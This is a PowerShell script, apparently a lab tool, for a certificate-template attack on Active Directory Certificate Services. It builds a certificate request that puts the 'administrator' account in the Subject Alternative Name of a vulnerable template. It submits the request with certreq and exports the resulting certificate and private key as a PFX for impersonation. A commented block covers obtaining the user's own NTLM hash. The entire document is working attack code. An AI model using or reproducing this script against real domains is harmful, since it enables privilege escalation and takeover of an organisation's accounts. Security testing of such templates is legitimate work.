$password = Read-Host -Prompt "Enter Password"
$server = "admin" #This will just decide the name of the cert request files that are created. I didn't want to change the var name so it's server for now. 
$CERTPATH = "C:\Users\JPZ40775\Desktop\" #Where do you want the cert requests to be stored?
$CAFQDN = "" #hostname of underlying CA box.
$CASERVER = "" #CA name.
$CA = $CAFQDN + "\" + $CASERVER
$CERTFILE = "C:\Users\lowpriv\Desktop\cert.pfx" #FULL PATH TO WHERE YOU WANT PFX TO BE GENERATED.
$TEMPLATE = "Wifi" #Vulnerable template to target. USE COMMON NAME *NOT* FRIENDLY NAME!!!
$domain = "alexlab.local" #domain
$target = "administrator" #Account username you're trying to impersonate

write-host "Variables set. Continue to create .inf"  -foregroundcolor green

write-host "Generating Certificate INF File..."
$certinf = @"
;---------------CertificateRequestTemplate.inf--------------
[NewRequest]                                                 
Subject="CN=$domain\$target"                                       
Exportable=TRUE                                             
KeySpec=1                                                    
KeyUsage=0xf0
[Extensions]
2.5.29.17 = "{text}" ; SAN - Subject Alternative Name
_continue_ = "upn=$target@$domain&"                                                                                         
[RequestAttributes]
CertificateTemplate=$TEMPLATE
"@


#Uncomment the below INF if you want to request a cert for yourself and get your own NTLM hash.
#$certinf = @"
#;---------------CertificateRequestTemplate.inf--------------
#[NewRequest]                                                 
#Subject="CN=$server"                                       
#Exportable=TRUE                                             
#KeySpec=1                                                    
#KeyUsage=0xf0                                                                                         
#[RequestAttributes]
#CertificateTemplate=$TEMPLATE
#"@

$certinf > "$CERTPATH$server.inf"


write-host ".inf created. Continue to create .req file"  -foregroundcolor green

CertReq.exe -new "$CERTPATH$server.inf" "$CERTPATH$server.req"

write-host ".req created. Checking to see of files exist"  -foregroundcolor green

$testinf = Test-Path "$CERTPATH$server.inf"
$testreq = Test-Path "$CERTPATH$server.req"

if ($testinf -eq $true){
write-host "$CERTPATH$server.inf successfully generated." -foregroundcolor green
}
else {
write-host "$CERTPATH$server.inf could not be found. Check for errors." -ForegroundColor Red
break
}
if ($testreq -eq $true){
write-host "$CERTPATH$server.req successfully generated." -foregroundcolor green
}
else {
write-host "$CERTPATH$server.req could not be found. Check for errors." -ForegroundColor Red
break
}

write-host "Submitting new Certificate for $server"

CertReq -Submit -config "$CA" "$CERTPATH$server.req" "$CERTPATH$server.cer"

write-host "Importing .cer"

certreq -accept "$CERTPATH$server.cer" -user
write-host "All OK. Continue"  -foregroundcolor green


#Exporting certificate with Private Key
write-host "Exporting PFX with private key"

$Thumbprint = gci Cert:\CurrentUser\My | Select-Object -Property Thumbprint -Last 1

certutil  -user -p $password -exportpfx My $Thumbprint.Thumbprint $CERTFILE "nochain"